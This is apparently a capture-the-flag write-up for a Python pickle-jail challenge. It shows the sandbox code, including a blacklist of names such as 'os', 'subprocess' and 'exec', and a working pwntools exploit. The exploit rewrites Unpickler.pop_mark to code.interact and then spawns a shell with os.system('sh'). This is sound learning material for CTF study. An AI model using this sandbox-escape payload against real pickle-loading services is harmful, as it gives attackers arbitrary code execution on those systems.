# easyJail

Attachment:

```python
# pylint: disable = unnecessary-lambda-assignment, protected-access, redefined-builtin
import pickle
from io import BytesIO
from base64 import b64decode

_dispatch = pickle._Unpickler.dispatch

_noop = lambda *_: None
_noop_code = _noop.__code__

_DISABLED_OPCODES = [
    pickle.NEWOBJ_EX[0],
    pickle.INST[0],
    pickle.REDUCE[0],
    pickle.OBJ[0],
    pickle.NEWOBJ[0],
]

for opcode in _DISABLED_OPCODES:
    _dispatch.pop(opcode)

pickle._Unpickler.dispatch = _dispatch

for method_name in (
    "load_newobj_ex",
    "load_obj",
    "load_reduce",
    "load_newobj",
    "load_inst",
):
    handler = getattr(pickle._Unpickler, method_name)
    handler.__code__ = _noop_code

__builtins__ = {
    "input": input,
    "ValueError": ValueError,
    "bytes": bytes,
    "isinstance": isinstance,
}

del _dispatch
del _noop
del _noop_code
del _DISABLED_OPCODES
del opcode

_BLACKLISTED_SUBSTRINGS = {
    "var",
    "input",
    "builtin",
    "set",
    "get",
    "import",
    "open",
    "subprocess",
    "sys",
    "eval",
    "exec",
    "os",
    "compile",
}


def loads(data: bytes):
    if not isinstance(data, bytes):
        raise TypeError("expected bytes")

    for token in _BLACKLISTED_SUBSTRINGS:
        if token.encode() in data:
            raise ValueError(f"{token} not allowed")

    buffer = BytesIO(data)
    return pickle._Unpickler(buffer).load()


opcode = b64decode(input("Enter your pickle: ").encode())
del b64decode
loads(opcode)
```

Requirments:

1. banned pickle `NEWOBJ_EX/INST/REDUCE/OBJ/NEWOBJ` opcodes: override `pickle._Unpickler.pop_mark` to `code.interact` and trigger `pop_mark()` via `TUPLE`

Inspired by [you-shall-not-call-revenge](https://github.com/jailctf/pyjail-collection/tree/3a4146c8df69f0ba65f1aa8fe7fe46b8711fa2ca/chals/you-shall-not-call-revenge):

```python
from pwn import *
from pickle import *
import base64

context(log_level="debug")


payload = (
    # memo 1 = pickle._Unpickler
    (GLOBAL + b"pickle\n_Unpickler\n" + PUT + b"1\n")
    # memo 2 = code.interact
    + (GLOBAL + b"code\ninteract\n" + PUT + b"2\n")
    # pickle._Unpickler.pop_mark = code.interact
    + (
        GET
        + b"1\n"
        + NONE
        + MARK
        + UNICODE
        + b"pop_mark\n"
        + GET
        + b"2\n"
        + DICT
        + TUPLE2
        + BUILD
        + POP
    )
    # trigger pop_mark() and call code.interact()
    + TUPLE
    + STOP
)

if args.HOST:
    p = remote(args.HOST, args.PORT, ssl=True)
else:
    p = process(["python3", "chal.py"])

p.sendline(base64.b64encode(payload))
p.recvuntil(b">>>")
p.sendline(b"import os;os.system('sh')")
p.interactive()
```
